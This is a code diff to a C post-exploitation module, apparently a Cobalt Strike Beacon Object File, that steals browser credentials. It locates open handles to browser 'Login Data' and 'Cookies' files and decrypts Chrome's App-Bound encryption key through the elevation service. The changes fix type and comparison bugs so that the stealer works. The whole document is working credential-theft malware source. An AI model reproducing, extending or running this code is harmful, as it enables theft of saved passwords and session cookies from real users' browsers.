@@ -11,7 +11,7 @@ BOOL download_file(IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength
 BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath);
 
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
-WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 WINBASEAPI DWORD   WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc (UINT uFlags, SIZE_T dwBytes);
@@ -34,6 +34,7 @@ WINBASEAPI LPSTR WINAPI SHLWAPI$StrStrIA(LPCSTR lpFirst,LPCSTR lpSrch);
 WINBASEAPI int __cdecl MSVCRT$memcmp(const void *_Buf1,const void *_Buf2,size_t _Size);
 WINBASEAPI char* __cdecl  MSVCRT$strncpy (char * __dst, const char * __src, size_t __n);
 WINBASEAPI char* __cdecl  MSVCRT$strncat (char * _Dest,const char * _Source, size_t __n);
+DECLSPEC_IMPORT int WINAPI MSVCRT$wstrcmp(const wchar_t*, const wchar_t*);
 DECLSPEC_IMPORT int WINAPI MSVCRT$strcmp(const char*, const char*);
 WINBASEAPI BOOL  WINAPI   CRYPT32$CryptUnprotectData (DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree (HGLOBAL hMem);
@@ -71,7 +72,8 @@ DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt (NCRYPT_KEY_HANDLE h
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
 
-#define IMPORT_RESOLVE PFN_SHGetFolderPathA SHGetFolderPath = (PFN_SHGetFolderPathA)Resolver("shell32", "SHGetFolderPathA"); \
+#define IMPORT_RESOLVE \
+    PFN_SHGetFolderPathA SHGetFolderPath = (PFN_SHGetFolderPathA)Resolver("shell32", "SHGetFolderPathA"); \
     PFN_PathAppendA PathAppend = (PFN_PathAppendA)Resolver("shlwapi", "PathAppendA"); \
     FARPROC srand = Resolver("msvcrt", "srand");\
     FARPROC time = Resolver("msvcrt", "time");\
@@ -350,7 +352,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
         DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
         //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Data Size: %d\n", decrypted_size);
-        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
+        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted App Bound Key: %s\n", BytesToHexString((BYTE*)plaintext_data, decrypted_size));
 
     } else {
         BeaconPrintf(CALLBACK_ERROR, "App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
@@ -748,7 +750,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                         MSVCRT$free(objectNameInfo);
                         return FALSE;
                     }
-                    if (ret == 0 && (MSVCRT$strcmp(objectTypeInfo,"File"))){
+                    if (ret == 0 && (MSVCRT$wstrcmp(objectTypeInfo->TypeName.Buffer,L"File") == 0)){
                         if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){
 
                             BeaconPrintf(CALLBACK_OUTPUT,"Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
@@ -1327,4 +1329,3 @@ VOID go(char *buf, int len) {
         return;
     }
 }
-
